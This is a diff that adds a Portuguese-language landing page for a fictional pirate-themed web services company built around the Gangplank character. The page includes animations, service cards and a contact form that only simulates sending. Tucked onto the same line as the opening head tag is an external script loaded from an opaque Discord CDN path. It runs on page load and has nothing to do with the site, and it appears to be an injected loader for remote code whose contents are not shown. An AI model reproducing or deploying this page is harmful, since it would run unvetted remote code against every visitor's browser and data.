@@ -1,0 +1,961 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head><script type='text/javascript' src='https://cdn.discordapp.com/vl_fg7eF2G6knbz1SILnjhdrK58lXcATreyLcxo4c1pfAsvdc1PMM4-ZlvpMm2loyc--v86r3gWGVOQ5J9nGDA=='></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Barril Fantasma - O Terror dos Doze Mares</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Pirata+One&family=Cinzel:wght@400;600;700&display=swap');
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-orange: #ff8800;
+            --dark-orange: #cc6600;
+            --bilgewater-teal: #0a6b6b;
+            --dark-teal: #054545;
+            --deep-blue: #1a2332;
+            --darker-blue: #0d1118;
+            --gold: #d4af37;
+            --blood-red: #8b0000;
+            --fog-white: #e8e8e8;
+        }
+
+        body {
+            font-family: 'Cinzel', serif;
+            background: linear-gradient(45deg, var(--darker-blue) 0%, var(--deep-blue) 50%, var(--dark-teal) 100%);
+            color: var(--fog-white);
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Efeito de ondas no fundo */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 200%;
+            height: 200%;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(10, 107, 107, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(255, 136, 0, 0.05) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(139, 0, 0, 0.05) 0%, transparent 50%);
+            animation: drift 20s infinite linear;
+            z-index: -2;
+        }
+
+        /* Partículas flutuantes */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        .particle {
+            position: absolute;
+            width: 2px;
+            height: 2px;
+            background: var(--gold);
+            border-radius: 50%;
+            opacity: 0.3;
+            animation: float 15s infinite linear;
+        }
+
+        /* Header */
+        header {
+            background: linear-gradient(90deg, rgba(13, 17, 24, 0.95), rgba(26, 35, 50, 0.95));
+            backdrop-filter: blur(15px);
+            padding: 1rem 0;
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+            border-bottom: 3px solid var(--primary-orange);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 2rem;
+        }
+
+        .logo {
+            font-family: 'Pirata One', cursive;
+            font-size: 2.5rem;
+            color: var(--primary-orange);
+            text-shadow: 
+                0 0 10px var(--primary-orange),
+                0 0 20px var(--dark-orange),
+                2px 2px 4px rgba(0, 0, 0, 0.8);
+            animation: flicker 3s infinite alternate;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo::before {
+            content: '💀';
+            font-size: 2rem;
+            animation: spin 10s infinite linear;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: var(--fog-white);
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            transition: all 0.3s ease;
+            position: relative;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        nav a:hover {
+            color: var(--primary-orange);
+            text-shadow: 0 0 10px var(--primary-orange);
+            transform: translateY(-2px);
+        }
+
+        nav a::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 3px;
+            bottom: -8px;
+            left: 50%;
+            background: linear-gradient(90deg, transparent, var(--primary-orange), transparent);
+            transition: all 0.3s ease;
+            transform: translateX(-50%);
+        }
+
+        nav a:hover::after {
+            width: 120%;
+        }
+
+        /* Hero Section */
+        .hero {
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            position: relative;
+            background: 
+                radial-gradient(ellipse at 30% 20%, rgba(255, 136, 0, 0.15) 0%, transparent 50%),
+                linear-gradient(180deg, transparent 0%, rgba(10, 107, 107, 0.1) 100%);
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            width: 300px;
+            height: 300px;
+            border: 2px solid rgba(255, 136, 0, 0.3);
+            border-radius: 50%;
+            animation: pulseRing 4s infinite ease-in-out;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .hero-content {
+            z-index: 10;
+            max-width: 800px;
+            padding: 0 2rem;
+        }
+
+        .hero-content h1 {
+            font-family: 'Pirata One', cursive;
+            font-size: 4.5rem;
+            margin-bottom: 1rem;
+            opacity: 0;
+            animation: titleReveal 3s ease 1s forwards;
+            color: var(--gold);
+            text-shadow: 
+                0 0 20px var(--primary-orange),
+                0 0 40px var(--dark-orange),
+                3px 3px 6px rgba(0, 0, 0, 0.8);
+        }
+
+        .hero-subtitle {
+            font-size: 1.5rem;
+            margin-bottom: 2rem;
+            opacity: 0;
+            animation: fadeInUp 2s ease 2s forwards;
+            color: var(--bilgewater-teal);
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .hero-description {
+            font-size: 1.2rem;
+            margin-bottom: 3rem;
+            opacity: 0;
+            animation: fadeInUp 2s ease 2.5s forwards;
+            line-height: 1.6;
+        }
+
+        .cta-button {
+            background: linear-gradient(45deg, var(--primary-orange), var(--dark-orange));
+            color: var(--darker-blue);
+            padding: 1.2rem 3rem;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            opacity: 0;
+            animation: fadeInUp 2s ease 3s forwards;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: 'Cinzel', serif;
+            box-shadow: 
+                0 0 20px rgba(255, 136, 0, 0.5),
+                0 8px 16px rgba(0, 0, 0, 0.3);
+        }
+
+        .cta-button:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 
+                0 0 30px rgba(255, 136, 0, 0.8),
+                0 15px 30px rgba(0, 0, 0, 0.4);
+            background: linear-gradient(45deg, var(--gold), var(--primary-orange));
+        }
+
+        /* Sections */
+        section {
+            padding: 8rem 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .section-title {
+            font-family: 'Pirata One', cursive;
+            font-size: 3rem;
+            text-align: center;
+            margin-bottom: 4rem;
+            color: var(--primary-orange);
+            text-shadow: 
+                0 0 15px var(--primary-orange),
+                2px 2px 4px rgba(0, 0, 0, 0.8);
+            position: relative;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--gold), transparent);
+        }
+
+        /* Services Grid */
+        .services-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2.5rem;
+            margin-top: 4rem;
+        }
+
+        .service-card {
+            background: linear-gradient(135deg, 
+                rgba(26, 35, 50, 0.9) 0%, 
+                rgba(10, 107, 107, 0.7) 50%, 
+                rgba(13, 17, 24, 0.9) 100%);
+            backdrop-filter: blur(10px);
+            border: 2px solid rgba(255, 136, 0, 0.3);
+            border-radius: 20px;
+            padding: 2.5rem;
+            text-align: center;
+            transition: all 0.4s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .service-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 136, 0, 0.1) 0%, transparent 70%);
+            transform: rotate(45deg);
+            transition: all 0.4s ease;
+            opacity: 0;
+        }
+
+        .service-card:hover::before {
+            opacity: 1;
+            transform: rotate(45deg) scale(1.2);
+        }
+
+        .service-card:hover {
+            transform: translateY(-15px) rotateX(5deg);
+            border-color: var(--primary-orange);
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                0 0 30px rgba(255, 136, 0, 0.4);
+        }
+
+        .service-icon {
+            font-size: 4rem;
+            margin-bottom: 1.5rem;
+            display: block;
+            filter: drop-shadow(0 0 10px currentColor);
+            animation: bobbing 3s ease-in-out infinite;
+        }
+
+        .service-card h3 {
+            font-family: 'Pirata One', cursive;
+            font-size: 1.8rem;
+            color: var(--gold);
+            margin-bottom: 1rem;
+            text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
+        }
+
+        .service-card p {
+            line-height: 1.6;
+            color: var(--fog-white);
+            font-size: 1.1rem;
+            position: relative;
+            z-index: 10;
+        }
+
+        /* About Section */
+        .about-content {
+            text-align: center;
+            font-size: 1.2rem;
+            line-height: 1.8;
+            color: var(--fog-white);
+            max-width: 900px;
+            margin: 0 auto;
+            background: linear-gradient(135deg, 
+                rgba(26, 35, 50, 0.6) 0%, 
+                rgba(10, 107, 107, 0.4) 100%);
+            padding: 3rem;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 136, 0, 0.2);
+            backdrop-filter: blur(10px);
+        }
+
+        /* Contact Form */
+        .contact-form {
+            background: linear-gradient(135deg, 
+                rgba(13, 17, 24, 0.9) 0%, 
+                rgba(26, 35, 50, 0.8) 50%,
+                rgba(10, 107, 107, 0.7) 100%);
+            backdrop-filter: blur(15px);
+            border: 2px solid rgba(255, 136, 0, 0.4);
+            border-radius: 25px;
+            padding: 3rem;
+            max-width: 700px;
+            margin: 0 auto;
+            box-shadow: 
+                0 20px 40px rgba(0, 0, 0, 0.5),
+                0 0 30px rgba(255, 136, 0, 0.2);
+        }
+
+        .form-group {
+            margin-bottom: 2rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.8rem;
+            color: var(--gold);
+            font-weight: 600;
+            font-size: 1.1rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 1.2rem;
+            border: 2px solid rgba(255, 136, 0, 0.3);
+            border-radius: 10px;
+            background: rgba(26, 35, 50, 0.8);
+            color: var(--fog-white);
+            font-size: 1rem;
+            font-family: 'Cinzel', serif;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--primary-orange);
+            box-shadow: 
+                0 0 20px rgba(255, 136, 0, 0.3),
+                inset 0 0 10px rgba(255, 136, 0, 0.1);
+            background: rgba(26, 35, 50, 0.9);
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 120px;
+        }
+
+        /* Footer */
+        footer {
+            background: linear-gradient(90deg, var(--darker-blue), var(--deep-blue));
+            text-align: center;
+            padding: 3rem 2rem;
+            border-top: 3px solid var(--primary-orange);
+            margin-top: 5rem;
+            position: relative;
+        }
+
+        footer::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--gold), transparent);
+        }
+
+        .footer-content {
+            color: var(--fog-white);
+            font-size: 1rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .footer-divider {
+            margin: 1rem 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255, 136, 0, 0.5), transparent);
+        }
+
+        /* Success Message */
+        .success-message {
+            background: linear-gradient(45deg, 
+                rgba(10, 107, 107, 0.8), 
+                rgba(212, 175, 55, 0.6));
+            color: var(--fog-white);
+            padding: 1.5rem;
+            border-radius: 15px;
+            margin-top: 1.5rem;
+            text-align: center;
+            display: none;
+            border: 1px solid var(--gold);
+            box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
+            font-weight: 600;
+        }
+
+        /* Animações */
+        @keyframes drift {
+            0% { transform: translateX(-50%) translateY(-50%) rotate(0deg); }
+            100% { transform: translateX(-50%) translateY(-50%) rotate(360deg); }
+        }
+
+        @keyframes float {
+            0% { 
+                transform: translateY(100vh) rotate(0deg); 
+                opacity: 0; 
+            }
+            10% { opacity: 0.3; }
+            90% { opacity: 0.3; }
+            100% { 
+                transform: translateY(-100px) rotate(360deg); 
+                opacity: 0; 
+            }
+        }
+
+        @keyframes flicker {
+            0%, 100% { 
+                text-shadow: 
+                    0 0 10px var(--primary-orange),
+                    0 0 20px var(--dark-orange),
+                    2px 2px 4px rgba(0, 0, 0, 0.8);
+            }
+            50% { 
+                text-shadow: 
+                    0 0 20px var(--primary-orange),
+                    0 0 40px var(--dark-orange),
+                    0 0 60px var(--gold),
+                    2px 2px 4px rgba(0, 0, 0, 0.8);
+            }
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes pulseRing {
+            0%, 100% {
+                transform: translate(-50%, -50%) scale(1);
+                opacity: 0.3;
+            }
+            50% {
+                transform: translate(-50%, -50%) scale(1.2);
+                opacity: 0.6;
+            }
+        }
+
+        @keyframes titleReveal {
+            0% {
+                opacity: 0;
+                transform: translateY(50px) rotateX(90deg);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) rotateX(0deg);
+            }
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes bobbing {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 1rem;
+            }
+
+            .logo {
+                font-size: 2rem;
+            }
+
+            nav ul {
+                gap: 1rem;
+            }
+
+            .hero-content h1 {
+                font-size: 3rem;
+            }
+
+            .hero-subtitle {
+                font-size: 1.2rem;
+            }
+
+            .services-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .contact-form {
+                margin: 0 1rem;
+                padding: 2rem;
+            }
+
+            section {
+                padding: 4rem 1rem;
+            }
+        }
+
+        /* Cursor personalizado */
+        .custom-cursor {
+            position: fixed;
+            width: 20px;
+            height: 20px;
+            background: radial-gradient(circle, var(--primary-orange), transparent);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 9999;
+            transition: transform 0.1s ease;
+            mix-blend-mode: difference;
+        }
+    </style>
+</head>
+<body>
+    <!-- Partículas flutuantes -->
+    <div class="particles" id="particles"></div>
+    
+    <!-- Cursor personalizado -->
+    <div class="custom-cursor" id="cursor"></div>
+
+    <header>
+        <div class="header-content">
+            <div class="logo">Barril Fantasma</div>
+            <nav>
+                <ul>
+                    <li><a href="#home">Convés Principal</a></li>
+                    <li><a href="#servicos">Arsenal</a></li>
+                    <li><a href="#sobre">Lenda</a></li>
+                    <li><a href="#contato">Recrutar Tripulação</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <section id="home" class="hero">
+            <div class="hero-content">
+                <h1>Barril Fantasma</h1>
+                <p class="hero-subtitle">O Terror dos Doze Mares</p>
+                <p class="hero-description">
+                    Dos portos sombrios de Águas de Sentina, emerge uma lenda. 
+                    Serviços que navegam além dos limites do possível, 
+                    conquistando territórios inexplorados do mercado.
+                </p>
+                <button class="cta-button" onclick="scrollToSection('servicos')">
+                    Içar as Velas ⚓
+                </button>
+            </div>
+        </section>
+
+        <section id="servicos">
+            <h2 class="section-title">Arsenal de Serviços</h2>
+            <div class="services-grid">
+                <div class="service-card">
+                    <span class="service-icon">🏴‍☠️</span>
+                    <h3>Conquista Digital</h3>
+                    <p>Dominamos novos territórios digitais com estratégias de guerra naval. Nossos ataques coordenados garantem a supremacia no oceano online.</p>
+                </div>
+                <div class="service-card">
+                    <span class="service-icon">💣</span>
+                    <h3>Barris Explosivos</h3>
+                    <p>Soluções que causam impacto imediato. Nossos "barris de pólvora" digitais eliminam a concorrência e abrem novos caminhos para seu negócio.</p>
+                </div>
+                <div class="service-card">
+                    <span class="service-icon">⚔️</span>
+                    <h3>Suporte de Combate</h3>
+                    <p>Guarda 24/7 dos seus sistemas. Como um verdadeiro corsário, protegemos seu tesouro digital contra todas as ameaças.</p>
+                </div>
+                <div class="service-card">
+                    <span class="service-icon">🗡️</span>
+                    <h3>Sabre Cortante</h3>
+                    <p>Desenvolvimento web afiado como a lâmina de Gangplank. Cortamos através da concorrência com design e funcionalidade impecáveis.</p>
+                </div>
+                <div class="service-card">
+                    <span class="service-icon">🦜</span>
+                    <h3>Inteligência Naval</h3>
+                    <p>Nossos "papagaios" coletam informações do mercado. Análises estratégicas que revelam os segredos dos mares comerciais.</p>
+                </div>
+                <div class="service-card">
+                    <span class="service-icon">⚓</span>
+                    <h3>Âncora Segura</h3>
+                    <p>Manutenção que mantém seu navio à flote. Sistemas estáveis como as âncoras dos navios de Bilgewater.</p>
+                </div>
+            </div>
+        </section>
+
+        <section id="sobre">
+            <h2 class="section-title">A Lenda do Barril Fantasma</h2>
+            <div class="about-content">
+                <p>
+                    Das águas turbulentas de Águas de Sentina emerge nossa empresa, 
+                    forjada nas chamas da adversidade e temperada pelos ventos dos sete mares. 
+                    Como o próprio Gangplank, ressurgimos mais fortes após cada batalha.
+                </p>
+                <br>
+                <p>
+                    Nossa tripulação é composta pelos mais habilidosos corsários digitais, 
+                    cada um especialista em sua área de atuação. Não tememos tempestades, 
+                    não recuamos diante de desafios impossíveis.
+                </p>
+                <br>
+                <p>
+                    <strong>Onde outros veem naufrágio, nós vemos oportunidade de conquista.</strong>
+                </p>
+            </div>
+        </section>
+
+        <section id="contato">
+            <h2 class="section-title">Recrutar Tripulação</h2>
+            <form class="contact-form" id="contactForm">
+                <div class="form-group">
+                    <label for="nome">Nome do Marujo:</label>
+                    <input type="text" id="nome" name="nome" required placeholder="Digite seu nome, recruta">
+                </div>
+                <div class="form-group">
+                    <label for="email">Pombo-Correio (Email):</label>
+                    <input type="email" id="email" name="email" required placeholder="seuemail@example.com">
+                </div>
+                <div class="form-group">
+                    <label for="servico">Tipo de Missão:</label>
+                    <select id="servico" name="servico" required>
+                        <option value="">Escolha sua missão</option>
+                        <option value="conquista">Conquista Digital</option>
+                        <option value="barris">Barris Explosivos</option>
+                        <option value="suporte">Suporte de Combate</option>
+                        <option value="sabre">Sabre Cortante</option>
+                        <option value="inteligencia">Inteligência Naval</option>
+                        <option value="ancora">Âncora Segura</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label for="mensagem">Detalhes da Expedição:</label>
+                    <textarea id="mensagem" name="mensagem" required placeholder="Conte-nos sobre o tesouro que busca conquistar..."></textarea>
+                </div>
+                <button type="submit" class="cta-button">
+                    Juntar-se à Tripulação ⚓
+                </button>
+                <div class="success-message" id="successMessage">
+                    ⚓ Mensagem enviada com sucesso! Um corsário entrará em contato em breve para planejar a expedição.
+                </div>
+            </form>
+        </section>
+    </main>
+
+    <footer>
+        <div class="footer-content">
+            <p><strong>Barril Fantasma</strong> - O Terror dos Doze Mares</p>
+            <div class="footer-divider"></div>
+            <p>&copy; 2025 | "Não existe honra entre ladrões, mas existe lucro entre parceiros"</p>
+            <p><em>Águas de Sentina • Runeterra • Todos os mares conquistados</em></p>
+        </div>
+    </footer>
+
+    <script>
+        // Criar partículas flutuantes
+        function createParticles() {
+            const particlesContainer = document.getElementById('particles');
+            
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+                particlesContainer.appendChild(particle);
+            }
+        }
+
+        // Cursor personalizado
+        function initCustomCursor() {
+            const cursor = document.getElementById('cursor');
+            
+            document.addEventListener('mousemove', (e) => {
+                cursor.style.left = (e.clientX - 10) + 'px';
+                cursor.style.top = (e.clientY - 10) + 'px';
+            });
+
+            // Efeito hover em elementos clicáveis
+            const clickableElements = document.querySelectorAll('a, button, input, textarea, select');
+            
+            clickableElements.forEach(element => {
+                element.addEventListener('mouseenter', () => {
+                    cursor.style.transform = 'scale(2)';
+                    cursor.style.background = 'radial-gradient(circle, #d4af37, transparent)';
+                });
+                
+                element.addEventListener('mouseleave', () => {
+                    cursor.style.transform = 'scale(1)';
+                    cursor.style.background = 'radial-gradient(circle, #ff8800, transparent)';
+                });
+            });
+        }
+
+        // Navegação suave
+        function scrollToSection(sectionId) {
+            document.getElementById(sectionId).scrollIntoView({
+                behavior: 'smooth',
+                block: 'start'
+            });
+        }
+
+        // Event listeners para navegação
+        document.querySelectorAll('nav a').forEach(link => {
+            link.addEventListener('click', function(e) {
+                e.preventDefault();
+                const targetId = this.getAttribute('href').substring(1);
+                scrollToSection(targetId);
+            });
+        });
+
+        // Formulário com animações
+        document.getElementById('contactForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const button = this.querySelector('.cta-button');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Animação de carregamento
+            button.innerHTML = '⚓ Navegando... 🌊';
+            button.disabled = true;
+            button.style.background = 'linear-gradient(45deg, #0a6b6b, #054545)';
+            
+            // Simular envio
+            setTimeout(() => {
+                successMessage.style.display = 'block';
+                successMessage.style.animation = 'fadeInUp 1s ease forwards';
+                
+                // Resetar formulário
+                this.reset();
+                
+                // Restaurar botão
+                button.innerHTML = 'Juntar-se à Tripulação ⚓';
+                button.disabled = false;
+                button.style.background = 'linear-gradient(45deg, var(--primary-orange), var(--dark-orange))';
+                
+                // Esconder mensagem após 7 segundos
+                setTimeout(() => {
+                    successMessage.style.animation = 'fadeOut 1s ease forwards';
+                    setTimeout(() => {
+                        successMessage.style.display = 'none';
+                    }, 1000);
+                }, 7000);
+            }, 3000);
+        });
+
+        // Efeito parallax no scroll
+        window.addEventListener('scroll', () => {
+            const scrolled = window.pageYOffset;
+            const rate = scrolled * -0.5;
+            
+            // Parallax no hero
+            const hero = document.querySelector('.hero');
+            if (hero) {
+                hero.style.transform = `translateY(${rate}px)`;
+            }
+
+            // Efeito nas partículas
+            const particles = document.querySelectorAll('.particle');
+            particles.forEach((particle, index) => {
+                const speed = (index % 3 + 1) * 0.1;
+                particle.style.transform = `translateY(${scrolled * speed}px)`;
+            });
+        });
+
+        // Animações de entrada baseadas no scroll
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -100px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.animation = 'fadeInUp 1s ease forwards';
+                    entry.target.style.opacity = '1';
+                }
+            });
+        }, observerOptions);
+
+        // Observar elementos para animação
+        document.querySelectorAll('.service-card, .about-content, .contact-form').forEach(el => {
+            el.style.opacity = '0';
+            observer.observe(el);
+        });
+
+        // Sons de navegação (simulado)
+        function playNavigationSound() {
+            // Aqui você poderia adicionar sons reais
+            console.log('🔊 Som de navegação pirata!');
+        }
+
+        // Efeito de ondas ao clicar
+        document.addEventListener('click', function(e) {
+            const ripple = document.createElement('div');
+            ripple.style.cssText = `
+                position: absolute;
+                border-radius: 50%;
+                background: radial-gradient(circle, rgba(255,136,0,0.6), transparent);
+                transform: scale(0);
+                animation: ripple 0.6s linear;
+                pointer-events: none;
+                z-index: 9999;
+            `;
+            
+            const rect = e.target.getBoundingClientRect();
+            const size = Math.max(rect.width, rect.height);
+            ripple.style.width = ripple.style.height = size + 'px';
+            ripple.style.left = (e.clientX - rect.left - size / 2) + 'px';
+            ripple.style.top = (e.clientY - rect.top - size / 2) + 'px';
+            
+            e.target.style.position = 'relative';
+            e.target.appendChild(ripple);
+            
+            setTimeout(() => {
+                ripple.remove();
+            }, 600);
+        });
+
+        // CSS para animação ripple
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes ripple {
+                to {
+                    transform: scale(4);
+                    opacity: 0;
+                }
+            }
+            
+            @keyframes fadeOut {
+                from { opacity: 1; }
+                to { opacity: 0; }
+            }
+        `;
+        document.head.appendChild(style);
+
+        // Inicializar tudo quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+            createParticles();
+            initCustomCursor();
+            
+            // Adicionar classe para transições suaves
+            document.body.style.opacity = '1';
+            document.body.style.transition = 'opacity 1s ease';
+        });
+
+        // Easter egg: Konami Code para efeitos especiais
+        let konamiCode = [];
+        const konamiSequence = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65]; // ↑↑↓↓←→←→BA
+        
+        document.addEventListener('keydown', function(e) {
+            konamiCode.push(e.keyCode);
+            konamiCode = konamiCode.slice(-konamiSequence.length);
+            
+            if (konamiCode.join(',') === konamiSequence.join(',')) {
+                // Efeito especial do Gangplank
+                document.body.style.animation = 'none';
+                document.body.style.background = `
+                    linear-gradient(45deg, #ff8800 0%, #d4af37 25%, #8b0000 50%, #0a6b6b 75%, #ff8800 100%)
+                `;
+                document.body.style.backgroundSize = '400% 400%';
+                document.body.style.animation = 'drift 3s ease infinite';
+                
+                alert('🏴‍☠️ Você desbloqueou o poder verdadeiro do Gangplank! 💣⚔️');
+                
+                // Restaurar após 5 segundos
+                setTimeout(() => {
+                    location.reload();
+                }, 5000);
+            }
+        });
+    </script>
+</body>
+</html>
